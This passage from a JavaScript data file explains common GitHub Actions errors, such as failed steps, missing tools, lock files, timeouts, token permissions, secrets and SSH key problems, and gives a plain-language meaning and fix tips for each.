      {
        id: 'needsjob',
        cmd: "The workflow is not valid. Job 'deploy' depends on unknown job 'tset'.",
        title: 'Depends on unknown job',
        what: 'A needs: line names a job that does not exist.',
        use: 'A typo in a job ID.',
        parts: [["Job 'deploy'", 'The job with the bad needs line.'], ["unknown job 'tset'", 'The name it could not find.']],
      },
    ]),
  },
  {
    id: 'steps',
    tool: 'Steps',
    kind: 'log',
    title: 'A step fails',
    blurb: 'Open the failed step on the run page, read the last lines of its log, and match them here.',
    commands: fix([
      {
        id: 'exit1',
        cmd: 'Error: Process completed with exit code 1.',
        title: 'Process completed with exit code 1',
        what: 'A command in your step failed. This line only reports it. The real reason is in the lines above.',
        use: 'Every failed run command ends with this.',
        parts: [['exit code 1', 'The command returned a failure. 0 would be success.']],
        tips: ['Scroll up in the log. Look for the first "error" or "failed" line.', 'Run the same command on your own computer to see if it fails there too.'],
      },
      {
        id: 'e127',
        cmd: 'bash: line 1: pytest: command not found\nError: Process completed with exit code 127.',
        title: 'command not found (exit code 127)',
        what: 'The command is not installed on the runner.',
        use: 'You ran a tool without installing it first.',
        parts: [['command not found', 'The shell cannot find that program.'], ['exit code 127', 'The standard code for "not found".']],
        tips: ['Add an install step first, such as pip install -r requirements.txt.'],
      },
      {
        id: 'nopackage',
        cmd: 'npm error The `npm ci` command can only install with an existing package-lock.json',
        title: 'npm ci needs package-lock.json',
        what: 'npm ci installs exactly what the lock file says, and there is no lock file in the repository.',
        use: 'The file is missing, or it is in a subfolder.',
        parts: [['npm ci', 'A strict, repeatable install for CI.'], ['package-lock.json', 'The lock file npm install makes.']],
        tips: ['Run npm install on your computer, then commit package-lock.json.', 'If the project is in a subfolder, add working-directory: that-folder to the step.'],
      },
      {
        id: 'notfound',
        cmd: 'Error: Unable to resolve action `actions/checkout@v99`, unable to find version `v99`',
        title: 'Unable to resolve action',
        what: 'The action or the version after @ does not exist.',
        use: 'A typo, or a version that was never released.',
        parts: [['actions/checkout', 'The action.'], ['v99', 'The version it could not find.']],
        tips: ['Open the action’s page on github.com and look at its Releases.'],
      },
      {
        id: 'timeout',
        cmd: 'Error: The operation was canceled.\nThe job running on runner GitHub Actions 7 has exceeded the maximum execution time of 15 minutes.',
        title: 'Exceeded the maximum execution time',
        what: 'The job hit its timeout-minutes limit, or GitHub’s 6-hour limit.',
        use: 'A test that waits forever, or a command that asks a question and waits for an answer nobody can give.',
        parts: [['exceeded the maximum execution time', 'It was stopped.']],
        tips: ['Look at the last line the job printed. That is where it got stuck.', 'Add -y to install commands that ask for confirmation.'],
      },
      {
        id: 'cwd',
        cmd: 'ls: cannot access \'dist\': No such file or directory',
        title: 'No such file or directory',
        what: 'A file or folder is not where the step looks for it.',
        use: 'Often a missing checkout step, a build that did not run, or a different working folder.',
        parts: [['No such file or directory', 'It does not exist at that path.']],
        tips: ['Print the folder with ls -la as a debugging step.', 'Remember that every job has its own machine. A file made in one job is not in another unless you use an artifact.'],
      },
    ]),
  },
  {
    id: 'access',
    tool: 'Access',
    kind: 'log',
    title: 'Permissions and secrets',
    blurb: 'The run starts, but GitHub or a server refuses to let it do something.',
    commands: fix([
      {
        id: 'resource',
        cmd: 'Resource not accessible by integration',
        title: 'Resource not accessible by integration',
        what: 'The built-in token does not have permission for this action.',
        use: 'Creating a release, pushing a package or posting a comment with too few permissions.',
        parts: [['Resource not accessible', 'The token was refused.'], ['by integration', 'The token is the one GitHub made for this run.']],
        tips: ['Add the permission your step needs, such as contents: write for a release or packages: write for a package.', 'For a pull request from a fork, the token is always read-only.'],
      },
      {
        id: 'denied',
        cmd: 'denied: installation not allowed to Create organization package',
        title: 'Package push denied',
        what: 'The token may not create a package.',
        use: 'Pushing an image to ghcr.io without the right permission.',
        parts: [['denied', 'The registry said no.']],
        tips: ['Add packages: write under permissions.', 'If the image name already exists under another owner, use your own name in it.'],
      },
      {
        id: 'emptysecret',
        cmd: 'Error: Input required and not supplied: password',
        title: 'Input required and not supplied',
        what: 'A with: value was empty. Most often a secret that does not exist, or has a different name.',
        use: 'A login step where the secret is missing.',
        parts: [['Input required', 'The action needs this value.'], ['password', 'The setting that is empty.']],
        tips: ['Check the secret’s exact name under Settings > Secrets and variables > Actions.', 'Secrets are not available to pull requests from forks.'],
      },
      {
        id: 'sshperm',
        cmd: 'Permissions 0644 for \'/home/runner/.ssh/id_ed25519\' are too open.\nThis private key will be ignored.',
        title: 'SSH key permissions too open',
        what: 'ssh refuses a private key that other users could read.',
        use: 'Writing a key to a file and forgetting chmod.',
        parts: [['0644', 'Anyone on the machine can read it.'], ['too open', 'ssh refuses to use it.']],
        tips: ['Add chmod 600 ~/.ssh/id_ed25519 after writing the key.'],
      },
      {
        id: 'hostkey',
        cmd: 'Host key verification failed.',
        title: 'Host key verification failed',
        what: 'ssh does not know the server’s fingerprint, or it changed.',
        use: 'A first connection from a fresh runner.',
        parts: [['Host key verification', 'ssh checks that the server is really the one you expect.']],
        careful: 'Do not switch the check off with StrictHostKeyChecking=no. Run ssh-keyscan once, check the fingerprint, and save the line in a secret.',
      },
    ]),
  },
];

// Lets Node load this file for testing. Browsers ignore it.
if (typeof module !== 'undefined') module.exports = {
  GHA_CONCEPT_GROUPS, GHA_CONCEPT_WORDS, GHA_TRIGGER_GROUPS, GHA_TRIGGER_WORDS,
  GHA_EXPR_GROUPS, GHA_EXPR_WORDS, GHA_ACT_GROUPS, GHA_ACT_WORDS,
  GHA_ERR_GROUPS, GHA_ERR_WORDS,
};
